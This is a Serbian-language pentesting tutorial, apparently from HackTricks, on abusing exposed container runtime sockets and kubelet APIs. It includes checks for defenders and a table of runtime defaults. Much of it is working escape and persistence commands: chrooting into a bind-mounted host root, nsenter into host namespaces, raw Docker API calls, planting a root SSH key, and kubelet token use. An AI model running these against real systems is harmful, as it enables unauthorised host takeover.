# Izloženost Runtime API-ja i daemon-a

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni kompromitovani kontejneri uopšte ne počinju bekstvom iz namespace-a. Počinju pristupom kontrolnoj ravni runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman-om ili kubelet-om preko montiranog Unix socket-a ili izloženog TCP listener-a, napadač može da zatraži novi kontejner sa većim privilegijama, montira host filesystem, pridruži se host namespace-ovima ili preuzme osetljive informacije o node-u. U tim slučajevima, runtime API je stvarna bezbednosna granica, a njegovo kompromitovanje funkcionalno je veoma blisko kompromitovanju host-a.

Zato izloženost runtime socket-a treba dokumentovati odvojeno od zaštita kernela. Kontejner sa uobičajenim seccomp-om, capabilities-ima i MAC ograničenjima i dalje može biti na samo jedan API poziv od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran unutar njega. Kernel izolacija trenutnog kontejnera može da radi tačno kako je predviđeno, dok je upravljačka ravan runtime-a i dalje potpuno izložena.

## Modeli pristupa daemon-u

Docker Engine tradicionalno izlaže svoj privilegovani API preko lokalnog Unix socket-a `unix:///var/run/docker.sock`. Istorijski je bio izložen i udaljeno preko TCP listener-a kao što je `tcp://0.0.0.0:2375` ili TLS-om zaštićenog listener-a na portu `2376`. Udaljeno izlaganje daemon-a bez jake TLS zaštite i autentifikacije klijenta praktično pretvara Docker API u udaljeni root interfejs.

containerd, CRI-O, Podman i kubelet izlažu slične površine visokog uticaja. Nazivi i tokovi rada se razlikuju, ali logika je ista. Ako interfejs omogućava pozivaocu da kreira workload-e, montira host putanje, preuzima credentials ili menja pokrenute kontejnere, taj interfejs je privilegovani upravljački kanal i tako ga treba i tretirati.

Veb UI za upravljanje kontejnerima može da izloži istu granicu bez direktnog pristupa lokalnog naloga socket-u. Na primer, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) dokumentovao je neautentifikovano resetovanje administratorske lozinke u starijoj verziji 1.11.1. Lokalno dostupan UI tretirajte samo kao smernicu za proveru: potvrdite instaliranu verziju i ponašanje autentifikacije, stvarnu administratorsku kontrolu i da li njegov upravljani endpoint može da kreira kontejnere sa host bind mount-om sa pravom upisa. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) da upravljanje zasnovano na socket-u zahteva pristup Docker socket-u; rootless ili ograničeni endpoint menja uticaj na host. Nemojte zaključivati da postoji propust u autentifikaciji ili root pristup host-u samo na osnovu naziva procesa, porta ili niza verzije.

Uobičajene lokalne putanje koje vredi proveriti su:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Stariji ili specijalizovaniji stekovi mogu izlagati i krajnje tačke kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. One su ređe u modernim okruženjima, ali ako naiđete na njih, treba postupati jednako oprezno, jer predstavljaju površine za kontrolu runtime-a, a ne obične aplikacione sockete.

## Secure Remote Access

Ako daemon mora biti izložen izvan lokalnog socketa, veza treba da bude zaštićena pomoću TLS-a, po mogućnosti uz međusobnu autentifikaciju, tako da daemon proverava klijenta, a klijent proverava daemon. Stara navika da se Docker daemon radi lakšeg korišćenja otvara preko običnog HTTP-a jedna je od najopasnijih grešaka u administraciji kontejnera, jer je površina API-ja dovoljno moćna da direktno kreira privilegovane kontejnere.

Istorijski Docker obrazac konfiguracije izgledao je ovako:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Na hostovima zasnovanim na systemd-u, komunikacija sa daemon-om može da se pojavi i kao `fd://`, što znači da proces nasleđuje unapred otvoreni socket od systemd-a, umesto da ga sam direktno veže. Važna pouka nije tačna sintaksa, već bezbednosna posledica. Čim daemon počne da osluškuje izvan lokalnog socket-a sa strogo ograničenim dozvolama, bezbednost transporta i autentifikacija klijenata postaju obavezne, a ne opcione mere ojačavanja bezbednosti.

## Zloupotreba

Ako je prisutan runtime socket, utvrdite koji je, da li postoji kompatibilan klijent i da li je moguć pristup putem sirovog HTTP-a ili gRPC-a:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ove komande su korisne jer razlikuju nepostojeću putanju, montirani ali nedostupan socket i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi kontejner sa host bind mount-om ili deljenjem host namespace-a.

### Kada klijent nije instaliran

To što nema `docker`, `podman` ili drugog jednostavnog CLI-ja ne znači da je socket bezbedan. Docker Engine koristi HTTP preko svog Unix socket-a, a Podman izlaže i API kompatibilan sa Docker-om i Libpod-native API preko komande `podman system service`. To znači da čak i minimalno okruženje koje ima samo `curl` može biti dovoljno za upravljanje daemon-om:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Za izvršavanje PHP koda ograničeno pomoću `open_basedir`, [Unix socket connections remain a separate route](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) kada PHP proces ima OS dozvolu za povezivanje.

Ovo je važno tokom post-exploitation aktivnosti jer branioci ponekad uklone uobičajene klijentske binarne fajlove, ali ostave montiran management socket. Na Podman hostovima imajte na umu da se putanja visoke vrednosti razlikuje kod rootful i rootless deployment-a: `unix:///run/podman/podman.sock` za rootful servisne instance i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless instance.

### Kompletan primer: Docker socket do root pristupa hostu

Ako je `docker.sock` dostupan, klasičan način za bekstvo je pokretanje novog containera koji montira korenski fajl-sistem hosta, a zatim izvršavanje `chroot` komande nad njim:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Ovo omogućava direktno izvršavanje sa root privilegijama na hostu preko Docker daemon-a. Uticaj nije ograničen samo na čitanje datoteka. Kada uđe u novi container, napadač može da menja datoteke na hostu, prikuplja akreditive, postavi mehanizme za trajni pristup ili pokrene dodatna opterećenja sa privilegijama.

### Potpun primer: od Docker Socket-a do host namespace-ova

Ako napadač umesto pristupa samo datotečnom sistemu preferira ulazak u namespace:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Ovaj put vodi do hosta tako što se od runtime-a traži da kreira novi kontejner uz eksplicitno izlaganje host namespace-ova, umesto da se iskorišćava postojeći kontejner.

### Obrazac perzistencije preko Docker socketa

Kontrola runtime-a može da se koristi i za perzistenciju, a ne samo za jednokratni shell. Opšti obrazac je da se kreira pomoćni kontejner sa host mount-om, da se u montirani host fajl-sistem upiše materijal za ovlašćeni pristup ili startup hook, a zatim proveri da li ga host koristi.

Primer:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Ista ideja može da cilja systemd jedinice, cron fragmente, datoteke za pokretanje aplikacija ili SSH ključeve, u zavisnosti od toga šta operator želi da dokaže. Važno je da se trajna izmena vrši preko runtime daemonovih ovlašćenja nad sistemom datoteka hosta, a ne putem dodatnih privilegija u originalnom kontejneru.

### Pivot pomoću Raw Docker API pomoćnog alata

Kada Docker CLI nije dostupan, isti tok rada sa pomoćnim alatom i montiranjem hosta može da se pokrene putem HTTP-a preko Unix socketa. Opšti tok je: potvrditi API, napraviti pomoćni kontejner sa host bind mountom, pokrenuti ga, napraviti exec instancu i pokrenuti taj exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Konačan zahtev `/exec/<id>/start` zavisi od vraćenog exec ID-ja, ali bezbednosni aspekt ne zavisi od tačne JSON obrade: direktan pristup API-ju rootful Docker daemon-a dovoljan je da se zatraži pomoćno radno opterećenje sa većim privilegijama.

### Pun primer: containerd socket

Montirani `containerd` socket obično je podjednako opasan:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Ako je dostupan klijent sličniji Docker-u, `nerdctl` može biti praktičniji od `ctr` jer podržava poznate zastavice kao što su `--privileged`, `--pid=host` i `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Uticaj je ponovo kompromitacija hosta. Čak i ako nema alata specifičnih za Docker, drugi runtime API i dalje može da pruži iste administrativne mogućnosti. Na Kubernetes čvorovima, `crictl` takođe može biti dovoljan za izviđanje i interakciju sa kontejnerima jer direktno komunicira sa CRI endpoint-om.

### BuildKit soket

`buildkitd` je lako prevideti jer se često smatra „samo pozadinskim procesom za build“, ali taj daemon je i dalje privilegovana kontrolna ravan. Dostupan `buildkitd.sock` može napadaču omogućiti da pokrene proizvoljne build korake, pregleda mogućnosti worker-a, koristi lokalne kontekste iz kompromitovanog okruženja i zatraži opasna prava, kao što su `network.host` ili `security.insecure`, ako je daemon konfigurisan da ih dozvoli.

Prvi korisni koraci su:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Ako daemon prihvata zahteve za build, proverite da li su dostupna nesigurna ovlašćenja:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Tačan uticaj zavisi od konfiguracije daemona, ali rootful BuildKit servis sa permisivnim entitlements nije bezazlena pogodnost za developere. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, naročito na CI runnerima i deljenim build čvorovima.

### Kubelet API preko TCP-a

Kubelet nije container runtime, ali je i dalje deo ravni za upravljanje čvorom i često se razmatra u okviru iste granice poverenja. Ako je bezbedni port kubeleta `10250` dostupan iz workload-a ili su izloženi akreditivi čvora, kubeconfig fajlovi ili proxy prava, napadač može da izlista Pod-ove, preuzme logove ili izvršava komande u kontejnerima lokalnim za čvor, a da pritom uopšte ne prolazi kroz admission putanju Kubernetes API servera.

Počnite jednostavnim otkrivanjem:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Ako putanja kubelet-a ili API-server proxy-ja autorizuje `exec`, klijent koji podržava WebSocket može to da iskoristi za izvršavanje koda u drugim kontejnerima na čvoru. Zato je i `nodes/proxy` sa samo dozvolom `get` opasniji nego što zvuči: zahtev i dalje može da dođe do kubelet endpoint-a koji izvršavaju komande, a te direktne interakcije sa kubelet-om ne pojavljuju se u uobičajenim Kubernetes audit logovima.<sup>[[2]](#references)</sup>

## Provere

Cilj ovih provera je da utvrde da li kontejner može da dođe do neke upravljačke ravni koja je trebalo da ostane izvan granice poverenja.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Šta je ovde zanimljivo:

- Montirani runtime socket obično je direktan administratorski mehanizam, a ne puko otkrivanje informacija.
- TCP listener na portu `2375` bez TLS-a treba tretirati kao stanje koje omogućava daljinsko preuzimanje sistema.
- Promenljive okruženja kao što je `DOCKER_HOST` često otkrivaju da je workload namerno osmišljen da komunicira sa runtime okruženjem hosta.

## Podrazumevane postavke runtime okruženja

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje bezbednosti |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano lokalni Unix socket | `dockerd` sluša na lokalnom socketu, a daemon se obično pokreće sa root privilegijama | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slab ili nedostajući TLS na `2376` |
| Podman | Podrazumevano CLI bez daemon-a | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socketi ipak mogu biti izloženi kada je omogućena komanda `podman system service` | izlaganje `podman.sock`, široka dostupnost servisa, rootful API upotreba |
| containerd | Lokalni privilegovani socket | Administrativni API je izložen preko lokalnog socketa i obično ga koriste alati višeg nivoa | montiranje `containerd.sock`, širok pristup komandama `ctr` ili `nerdctl`, izlaganje privilegovanih namespace-ova |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen pouzdanim komponentama na samom node-u | montiranje `crio.sock`, izlaganje CRI endpoint-a nepouzdanim workload-ovima |
| Kubernetes kubelet | API za upravljanje dostupan samo na node-u | Kubelet ne bi trebalo da bude široko dostupan iz Pod-ova; pristup može otkriti stanje pod-ova, akreditive i mogućnosti izvršavanja, u zavisnosti od authn/authz podešavanja | montiranje kubelet socket-a ili sertifikata, slaba kubelet autentifikacija, host networking uz dostupan kubelet endpoint |



## References

- [1] [Eksploatacija containerd socket-a, prvi deo](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rizici zaobilaženja Kubernetes API servera](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
